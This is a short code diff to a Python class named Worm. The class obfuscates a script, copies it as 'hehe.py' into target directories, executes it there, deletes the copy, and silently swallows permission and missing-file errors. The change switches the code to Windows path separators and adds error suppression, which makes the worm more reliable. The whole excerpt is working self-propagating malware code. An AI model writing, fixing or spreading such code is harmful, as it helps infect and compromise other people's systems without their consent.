@@ -52,12 +52,14 @@ class Worm:
             os.system(f"python.exe {FUSCATE_DIR} -i {to_infect} -o {to_infect_o} -c 100 > /dev/null 2>&1")
 
             try:
-                with open(target + "/hehe.py", "w") as f:
+                with open(target + "\\hehe.py", "w") as f:
                     with open(to_infect_o, "r") as fe:
                         f.write(fe.read())
                 os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
-                os.remove(target + "/hehe.py")
+                os.remove(target + "\\hehe.py")
             except PermissionError:
+                pass
+            except FileNotFoundError:
                 pass
 
         os.remove(to_infect)
